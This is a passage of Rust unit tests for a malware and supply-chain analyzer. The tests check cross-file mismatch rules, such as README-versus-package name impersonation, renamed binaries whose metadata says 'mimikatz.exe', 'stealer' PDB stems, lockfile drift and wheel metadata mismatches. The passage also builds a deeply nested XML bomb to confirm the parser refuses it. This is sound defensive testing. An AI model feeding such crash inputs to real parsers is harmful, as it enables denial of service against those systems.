            (Some("README.md"), "markdown.first_heading")
        );
    }

    #[test]
    fn split_qualified_path_first_double_colon_wins() {
        // Nested cross-file references aren't supported; the first ::
        // is the split point even if the remaining path contains more.
        assert_eq!(split_qualified_path("a::b::c"), (Some("a"), "b::c"));
    }

    #[test]
    fn sibling_path_matches_archive_paths() {
        assert!(sibling_path_matches("package/package.json", "package.json"));
        assert!(sibling_path_matches(
            "mempalace_dashboard-0.5.0.dist-info/METADATA",
            "METADATA"
        ));
        // Case-insensitive.
        assert!(sibling_path_matches("foo/README.MD", "readme.md"));
        // Nested archive separator.
        assert!(sibling_path_matches(
            "outer.tgz!inner/package.json",
            "package.json"
        ));
        // No match.
        assert!(!sibling_path_matches("foo/bar.txt", "baz.txt"));
    }

    #[test]
    fn value_as_normalized_string_lowers_and_trims() {
        assert_eq!(
            value_as_normalized_string(json!("  @Img/Sharp-Win32-X64  ")),
            Some("@img/sharp-win32-x64".to_string())
        );
        assert_eq!(
            value_as_normalized_string(json!(42)),
            Some("42".to_string())
        );
        assert_eq!(
            value_as_normalized_string(json!(true)),
            Some("true".to_string())
        );
        // Containers and null are intentionally unsupported.
        assert_eq!(value_as_normalized_string(json!([1, 2, 3])), None);
        assert_eq!(value_as_normalized_string(json!({})), None);
        assert_eq!(value_as_normalized_string(json!(null)), None);
    }

    /// Build an evaluation context whose current-file values tree
    /// contains the supplied JSON, suitable for same-file eq/ne tests.
    fn ctx_with_values(values: serde_json::Value) -> EvaluationContext<'static> {
        create_test_ctx_with_values_tree(
            &[],
            Box::leak(Box::new(std::path::PathBuf::from("test"))),
            FileType::All,
            values,
        )
    }

    fn kv_eq(path: &str, eq: &str) -> Condition {
        Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: path.to_string(),
            exact: None,
            substr: None,
            regex: None,
            eq: Some(eq.to_string()),
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        })
    }

    fn kv_ne(path: &str, ne: &str) -> Condition {
        Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: path.to_string(),
            exact: None,
            substr: None,
            regex: None,
            eq: None,
            ne: Some(ne.to_string()),
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        })
    }

    #[test]
    fn eq_fires_when_same_file_paths_agree() {
        let ctx = ctx_with_values(json!({
            "a": {"name": "foo"},
            "b": {"name": "foo"},
        }));
        assert!(evaluate_kv(&kv_eq("a.name", "b.name"), &ctx).is_some());
    }

    #[test]
    fn eq_silent_when_same_file_paths_disagree() {
        let ctx = ctx_with_values(json!({
            "a": {"name": "foo"},
            "b": {"name": "bar"},
        }));
        assert!(evaluate_kv(&kv_eq("a.name", "b.name"), &ctx).is_none());
    }

    #[test]
    fn ne_fires_when_same_file_paths_disagree() {
        let ctx = ctx_with_values(json!({
            "a": {"name": "foo"},
            "b": {"name": "bar"},
        }));
        assert!(evaluate_kv(&kv_ne("a.name", "b.name"), &ctx).is_some());
    }

    #[test]
    fn ne_silent_when_same_file_paths_agree() {
        let ctx = ctx_with_values(json!({
            "a": {"name": "foo"},
            "b": {"name": "foo"},
        }));
        assert!(evaluate_kv(&kv_ne("a.name", "b.name"), &ctx).is_none());
    }

    #[test]
    fn eq_is_case_insensitive_by_default() {
        let ctx = ctx_with_values(json!({
            "x": "Foo",
            "y": "foo",
        }));
        assert!(evaluate_kv(&kv_eq("x", "y"), &ctx).is_some());
    }

    #[test]
    fn eq_trims_whitespace_by_default() {
        let ctx = ctx_with_values(json!({
            "x": "  hello\n",
            "y": "hello",
        }));
        assert!(evaluate_kv(&kv_eq("x", "y"), &ctx).is_some());
    }

    #[test]
    fn eq_silent_when_left_path_missing() {
        let ctx = ctx_with_values(json!({"y": "foo"}));
        assert!(evaluate_kv(&kv_eq("missing", "y"), &ctx).is_none());
    }

    #[test]
    fn eq_silent_when_right_path_missing() {
        let ctx = ctx_with_values(json!({"x": "foo"}));
        assert!(evaluate_kv(&kv_eq("x", "missing"), &ctx).is_none());
    }

    #[test]
    fn ne_silent_when_either_path_missing() {
        // ne treats missing values the same way: comparison undefined → no match.
        let ctx = ctx_with_values(json!({"x": "foo"}));
        assert!(evaluate_kv(&kv_ne("x", "missing"), &ctx).is_none());
        assert!(evaluate_kv(&kv_ne("missing", "x"), &ctx).is_none());
    }

    fn kv_ne_q(path: &str, ne: &str, match_mode: ArrayQuantifier) -> Condition {
        Condition::Kv(KvQuery {
            path: path.to_string(),
            ne: Some(ne.to_string()),
            match_mode,
            ..Default::default()
        })
    }

    #[test]
    fn eq_matches_any_array_element() {
        // Scalar vs array: existential by default — fires if SOME element matches.
        let ctx = ctx_with_values(json!({ "scalar": "foo", "arr": ["bar", "foo"] }));
        assert!(evaluate_kv(&kv_eq("scalar", "arr"), &ctx).is_some());
    }

    #[test]
    fn eq_silent_when_no_array_element_matches() {
        let ctx = ctx_with_values(json!({ "scalar": "foo", "arr": ["bar", "baz"] }));
        assert!(evaluate_kv(&kv_eq("scalar", "arr"), &ctx).is_none());
    }

    #[test]
    fn eq_rejects_object_values() {
        // A non-array container (object) has no scalar projection → no match.
        let ctx = ctx_with_values(json!({ "scalar": "foo", "obj": {"k": "foo"} }));
        assert!(evaluate_kv(&kv_eq("scalar", "obj"), &ctx).is_none());
    }

    #[test]
    fn ne_any_fires_when_an_array_element_differs() {
        // The fork-impersonation shape: declared owner vs source owners — `ne`
        // with the default `any` fires because at least one source differs.
        let ctx = ctx_with_values(json!({ "owner": "foo", "src": ["foo", "attacker"] }));
        assert!(evaluate_kv(&kv_ne("owner", "src"), &ctx).is_some());
    }

    #[test]
    fn ne_any_silent_when_all_array_elements_equal() {
        let ctx = ctx_with_values(json!({ "owner": "foo", "src": ["foo", "foo"] }));
        assert!(evaluate_kv(&kv_ne("owner", "src"), &ctx).is_none());
    }

    #[test]
    fn ne_all_requires_every_element_to_differ() {
        // `all`: the relation must hold for every right value. A matching
        // element means "not all differ" → no match; a disjoint set fires.
        let mixed = ctx_with_values(json!({ "owner": "foo", "src": ["foo", "attacker"] }));
        assert!(evaluate_kv(&kv_ne_q("owner", "src", ArrayQuantifier::All), &mixed).is_none());
        let disjoint = ctx_with_values(json!({ "owner": "foo", "src": ["a", "b"] }));
        assert!(evaluate_kv(&kv_ne_q("owner", "src", ArrayQuantifier::All), &disjoint).is_some());
    }

    /// Cross-file resolution: a sibling FileAnalysis with its own
    /// values_tree is reachable via the `<filename>::` prefix.
    #[test]
    fn eq_resolves_sibling_archive_entry_via_filename_prefix() {
        use crate::types::FileAnalysis;
        let mut report = AnalysisReport::new(TargetInfo {
            path: "outer.tgz".to_string(),
            file_type: "tar.gz".to_string(),
            size_bytes: 0,
            sha256: "".to_string(),
            architectures: None,
        });
        report.values_tree = Some(Box::new(json!({"name": "@devcarron/clob"})));

        let mut sibling = FileAnalysis::new(
            1,
            "package/README.md".to_string(),
            "markdown".to_string(),
            "".to_string(),
            0,
        );
        crate::types::core::flatten_kv_for_output(
            &json!({"markdown": {"first_heading": "@img/sharp-win32-x64"}}),
            &mut sibling.kv,
        );
        report.files.push(sibling);

        let report: &'static AnalysisReport = Box::leak(Box::new(report));
        let ctx = EvaluationContext::test_only_new(report, &[], FileType::All);

        // Mismatch fires `ne`.
        let cond = kv_ne("name", "README.md::markdown.first_heading");
        assert!(evaluate_kv(&cond, &ctx).is_some());
        // Same value silences `ne`.
        let cond = kv_eq("name", "README.md::markdown.first_heading");
        assert!(evaluate_kv(&cond, &ctx).is_none());
    }

    /// `<filename>::` lookup that targets a sibling whose name doesn't
    /// match anything in `report.files` produces no match (treated as
    /// "value missing" — same as a typo in a same-file path).
    #[test]
    fn eq_returns_no_match_when_sibling_filename_missing() {
        let ctx = ctx_with_values(json!({"a": "foo"}));
        let cond = kv_eq("a", "no_such_file.json::name");
        assert!(evaluate_kv(&cond, &ctx).is_none());
    }

    // ============================================================
    // Integration tests for the five canonical cross-file queries.
    //
    // Each pair: a positive fixture (the facts genuinely disagree,
    // matcher should fire) and a negative fixture (facts agree,
    // matcher must stay silent). The fixtures mirror the actual
    // filefacts schema so they exercise the same path shapes a real
    // analysis run would produce.
    // ============================================================

    use crate::types::FileAnalysis;

    fn report_for_integration(outer_path: &str, outer_values: Value) -> AnalysisReport {
        let mut report = AnalysisReport::new(TargetInfo {
            path: outer_path.to_string(),
            file_type: "archive".to_string(),
            size_bytes: 0,
            sha256: String::new(),
            architectures: None,
        });
        report.values_tree = Some(Box::new(outer_values));
        report
    }

    fn add_file_with_values(report: &mut AnalysisReport, path: &str, values: &Value) {
        let mut file = FileAnalysis::new(
            report.files.len() as u32 + 1,
            path.to_string(),
            "test".to_string(),
            String::new(),
            0,
        );
        // Mirror production: sibling values are read from the flattened `kv`.
        crate::types::core::flatten_kv_for_output(values, &mut file.kv);
        report.files.push(file);
    }

    fn ctx_from_report(report: AnalysisReport) -> EvaluationContext<'static> {
        let leaked: &'static AnalysisReport = Box::leak(Box::new(report));
        EvaluationContext::test_only_new(leaked, &[], FileType::All)
    }

    // ---- Query #1: README header impersonates package name -----

    #[test]
    fn integration_readme_impersonates_other_package() {
        // The clob case: README claims `@img/sharp-win32-x64`, package.json
        // declares `@devcarron/clob`. ne should fire.
        let mut report = report_for_integration("@devcarron-clob-2.73.0.tgz", json!({}));
        add_file_with_values(
            &mut report,
            "package/README.md",
            &json!({"markdown": {"first_heading": "@img/sharp-win32-x64"}}),
        );
        add_file_with_values(
            &mut report,
            "package/package.json",
            &json!({"name": "@devcarron/clob"}),
        );
        let ctx = ctx_from_report(report);

        let cond = kv_ne("README.md::markdown.first_heading", "package.json::name");
        assert!(evaluate_kv(&cond, &ctx).is_some(), "expected fire");
    }

    #[test]
    fn integration_readme_matches_package_no_match() {
        let mut report = report_for_integration("legit-pkg-1.0.0.tgz", json!({}));
        add_file_with_values(
            &mut report,
            "package/README.md",
            &json!({"markdown": {"first_heading": "legit-pkg"}}),
        );
        add_file_with_values(
            &mut report,
            "package/package.json",
            &json!({"name": "legit-pkg"}),
        );
        let ctx = ctx_from_report(report);

        let cond = kv_ne("README.md::markdown.first_heading", "package.json::name");
        assert!(evaluate_kv(&cond, &ctx).is_none(), "expected silence");
    }

    // ---- Query #2: PE filename masquerade -----

    #[test]
    fn integration_pe_filename_masquerade() {
        // Same-file comparison: an .exe whose embedded original_filename
        // disagrees with the on-disk basename → renamed binary.
        let ctx = ctx_with_values(json!({
            "file": {"basename": "update.exe"},
            "pe": {"version_info": {"original_filename": "mimikatz.exe"}},
        }));
        let cond = kv_ne("file.basename", "pe.version_info.original_filename");
        assert!(evaluate_kv(&cond, &ctx).is_some());
    }

    #[test]
    fn integration_pe_filename_matches_no_match() {
        let ctx = ctx_with_values(json!({
            "file": {"basename": "notepad.exe"},
            "pe": {"version_info": {"original_filename": "notepad.exe"}},
        }));
        let cond = kv_ne("file.basename", "pe.version_info.original_filename");
        assert!(evaluate_kv(&cond, &ctx).is_none());
    }

    // ---- Query #3: PDB path stem mismatch -----

    #[test]
    fn integration_pdb_stem_mismatch() {
        // PDB stem leaks an attribution name that doesn't match the
        // binary's own stem → build-pipeline anomaly / repack.
        let ctx = ctx_with_values(json!({
            "file": {"stem": "update"},
            "pe": {"debug": {"pdb": {"stem": "stealer"}}},
        }));
        let cond = kv_ne("file.stem", "pe.debug.pdb.stem");
        assert!(evaluate_kv(&cond, &ctx).is_some());
    }

    #[test]
    fn integration_pdb_stem_matches_no_match() {
        let ctx = ctx_with_values(json!({
            "file": {"stem": "notepad"},
            "pe": {"debug": {"pdb": {"stem": "notepad"}}},
        }));
        let cond = kv_ne("file.stem", "pe.debug.pdb.stem");
        assert!(evaluate_kv(&cond, &ctx).is_none());
    }

    // ---- Query #4: Lockfile drift -----

    #[test]
    fn integration_lockfile_name_drift() {
        // package-lock.json wasn't regenerated after package.json was
        // tampered → name drift signals one side was edited by hand.
        let mut report = report_for_integration("hijacked-1.2.3.tgz", json!({}));
        add_file_with_values(
            &mut report,
            "package/package.json",
            &json!({"name": "evil-replacement"}),
        );
        add_file_with_values(
            &mut report,
            "package/package-lock.json",
            &json!({"name": "original-victim"}),
        );
        let ctx = ctx_from_report(report);

        let cond = kv_ne("package.json::name", "package-lock.json::name");
        assert!(evaluate_kv(&cond, &ctx).is_some());
    }

    #[test]
    fn integration_lockfile_in_sync_no_match() {
        let mut report = report_for_integration("legit-1.2.3.tgz", json!({}));
        add_file_with_values(
            &mut report,
            "package/package.json",
            &json!({"name": "legit"}),
        );
        add_file_with_values(
            &mut report,
            "package/package-lock.json",
            &json!({"name": "legit"}),
        );
        let ctx = ctx_from_report(report);

        let cond = kv_ne("package.json::name", "package-lock.json::name");
        assert!(evaluate_kv(&cond, &ctx).is_none());
    }

    // ---- Query #5: Wheel filename vs METADATA::Name -----

    #[test]
    fn integration_wheel_filename_vs_metadata_name() {
        // Wheel outer filename declares one identity; the inner
        // METADATA blob declares another → repack signal.
        let mut report = report_for_integration(
            "fake_name-1.0.0-py3-none-any.whl",
            json!({
                "whl": {"filename": {"name_prefix": "fake_name"}}
            }),
        );
        add_file_with_values(
            &mut report,
            "realpkg-1.0.0.dist-info/METADATA",
            &json!({"Name": "realpkg"}),
        );
        let ctx = ctx_from_report(report);

        let cond = kv_ne("whl.filename.name_prefix", "METADATA::Name");
        assert!(evaluate_kv(&cond, &ctx).is_some());
    }

    #[test]
    fn integration_wheel_filename_matches_metadata_no_match() {
        let mut report = report_for_integration(
            "legit_pkg-1.0.0-py3-none-any.whl",
            json!({
                "whl": {"filename": {"name_prefix": "legit_pkg"}}
            }),
        );
        add_file_with_values(
            &mut report,
            "legit_pkg-1.0.0.dist-info/METADATA",
            &json!({"Name": "legit_pkg"}),
        );
        let ctx = ctx_from_report(report);

        let cond = kv_ne("whl.filename.name_prefix", "METADATA::Name");
        assert!(evaluate_kv(&cond, &ctx).is_none());
    }

    fn nested_xml(depth: usize) -> String {
        let mut xml = String::with_capacity(depth * 8 + 16);
        xml.push_str("<root>");
        for _ in 0..depth {
            xml.push_str("<g>");
        }
        for _ in 0..depth {
            xml.push_str("</g>");
        }
        xml.push_str("</root>");
        xml
    }

    /// A deeply nested XML document must be refused before parsing, not crash
    /// the analyzer. roxmltree's recursive-descent parser overflows the native
    /// stack on such input, so a malicious SVG/plist/manifest with thousands of
    /// nested elements was a stack-overflow DoS (SIGSEGV) before the pre-scan
    /// guard. Without the fix this test aborts the process with a stack overflow.
    #[test]
    fn test_xml_deeply_nested_is_refused_not_crash() {
        // Far deeper than MAX_XML_DEPTH and deep enough to overflow a default
        // test-thread stack if it ever reached roxmltree.
        let xml = nested_xml(8000);
        let path = Path::new("bomb.xml");
        assert!(
            parse_structured_content(path, xml.as_bytes()).is_none(),
            "over-deep XML must be refused, not parsed",
        );
    }

    /// Legitimately shallow XML must still parse — the guard must not reject
    /// the everyday config documents trait authors query.
    #[test]
    fn test_xml_shallow_still_parses() {
        let xml = nested_xml(MAX_XML_DEPTH / 4);
        let path = Path::new("config.xml");
        assert!(
            parse_structured_content(path, xml.as_bytes()).is_some(),
            "shallow XML within the depth bound must still parse",
        );
    }
}
